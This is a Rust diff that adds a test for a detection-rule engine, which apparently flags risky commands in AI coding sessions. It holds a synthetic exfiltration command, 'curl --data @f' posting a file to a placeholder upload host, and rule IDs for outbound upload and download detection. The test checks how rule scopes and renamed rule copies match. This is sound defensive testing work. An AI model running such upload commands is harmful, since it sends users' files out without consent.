@@ -1944,3 +1944,83 @@ fn process_action_links_by_exact_result_identity_including_dedupe_key() {
         }
     }
 }
+
+fn evaluate_with(document: &str, command: &str) -> (Vec<String>, Vec<String>) {
+    let rules = telltale_rules::load_rule_set_from_documents(&[document], None).unwrap();
+    let plan = compile_rule_v1(&rules.compatibility_export()).unwrap();
+    let instance = CorrelationId::source_reported("synthetic-source").unwrap();
+    let observations = [command_tool(
+        "segment",
+        command,
+        "2026-09-17T00:00:00Z",
+        IngestionMode::SessionStore,
+    )];
+    let output = evaluate_source_with_options(
+        CanonicalSourceInput {
+            client: ClientId::Claude,
+            source_id: "claude.projects",
+            source_instance: Some(&instance),
+            observations: &observations,
+        },
+        &plan,
+        None,
+        &DetailedEvaluationOptions::default(),
+    )
+    .unwrap();
+    let session = &output.sessions()[0];
+    let mut actions = session
+        .action_findings()
+        .iter()
+        .flat_map(|finding| finding.rule_ids().iter().cloned())
+        .filter(|id| id.contains("download") || id.contains("upload"))
+        .collect::<Vec<_>>();
+    actions.sort();
+    let mut rules = session
+        .rule_ids()
+        .iter()
+        .filter(|id| id.contains("download") || id.contains("upload"))
+        .cloned()
+        .collect::<Vec<_>>();
+    rules.sort();
+    (rules, actions)
+}
+
+#[test]
+fn segment_scoped_download_follows_the_declared_yaml_in_sessions_and_keeps_native_actions() {
+    let bundled = telltale_rules::bundled_default_rule_yaml();
+    let field_copy = bundled.replace("      scope: segment\n", "");
+    let fork = bundled
+        .replace("network.download", "fork.network.download")
+        .replace("exfil.outbound_upload", "fork.exfil.outbound_upload");
+    let both = ["exfil.outbound_upload", "network.download"].map(String::from);
+    let upload = ["exfil.outbound_upload".to_string()];
+    let separate =
+        "curl --data @f https://example.invalid/upload; curl https://example.invalid/file";
+    let same = "curl --data @f https://example.invalid/upload https://example.invalid/file";
+
+    // Bundled: the session reads the declared segment scope; native actions
+    // read HTTP direction per command stage, as before.
+    assert_eq!(
+        evaluate_with(bundled, separate),
+        (both.to_vec(), both.to_vec())
+    );
+    assert_eq!(
+        evaluate_with(bundled, same),
+        (upload.to_vec(), upload.to_vec())
+    );
+
+    // A renamed copy matches the same way in sessions: no rule ID selects it.
+    let (fork_separate, _) = evaluate_with(&fork, separate);
+    assert_eq!(
+        fork_separate,
+        ["fork.exfil.outbound_upload", "fork.network.download"]
+    );
+    assert_eq!(evaluate_with(&fork, same).0, ["fork.exfil.outbound_upload"]);
+
+    // A same-ID copy that declares field scope is a different predicate, so
+    // it is evaluated as written, not as the bundled native profile.
+    assert_eq!(
+        evaluate_with(&field_copy, separate),
+        (upload.to_vec(), upload.to_vec())
+    );
+}
